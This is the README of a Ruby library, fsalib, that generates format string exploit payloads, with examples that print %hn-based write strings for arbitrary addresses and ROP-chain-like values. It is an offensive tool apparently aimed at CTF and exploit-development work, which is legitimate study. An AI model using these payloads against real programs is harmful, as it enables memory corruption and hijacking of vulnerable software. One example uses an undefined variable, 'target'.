# fsalib

[![Build Status](https://travis-ci.org/owlinux1000/fsalib.svg?branch=master)](https://travis-ci.org/owlinux1000/fsalib)
[![MIT License](http://img.shields.io/badge/license-MIT-blue.svg?style=flat)](LICENSE)

I made this script based on [libformatstr](https://github.com/hellman/libformatstr).


## Install

```
$ gem install fsa
```

## Usage

### Basic

```ruby
#coding: ascii-8bit
require_relative 'fsa'

target_addr = 0x08049580

value = 0xdeadbeef
fmt = FSA.new()
fmt[target_addr] = value
p fmt.payload(0) # index of argument
#=> "%48879c%6$hn%8126c%7$hnA\x80\x95\x04\b\x82\x95\x04\b"

# Supported Array
value = [0xdeadbeef, 0xdeadbeef] # like ropchain
fmt = FSA.new()
fmt[target_addr] = value
p fmt.payload(0)
#=> "%48879c%9$hn%10$hn%8126c%11$hn%12$hn\x80\x95\x04\b\x84\x95\x04\b\x82\x95\x04\b\x86\x95\x04\b"

# Supported String
value = "H@CK"
fmt = FSA.new()
fmt[target] = value
p fmt.payload(0)
#=> "%16456c%6$hn%2811c%7$hnA\x80\x95\x04\b\x82\x95\x04\b"
```

### Advanced

```ruby
#coding: ascii-8bit
require_relative 'fsa'

target_addr = 0x08049580
value = 0xdead            # 2byte(Supported 2byte, 1byte)
fmt = FSA.new(30)         # padding 
fmt[target_addr] = value
p fmt.payload(0, start_len = 10) # len of already printed data
#=> "%57005c%3$hnAAL\xA0\x04\b\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

```
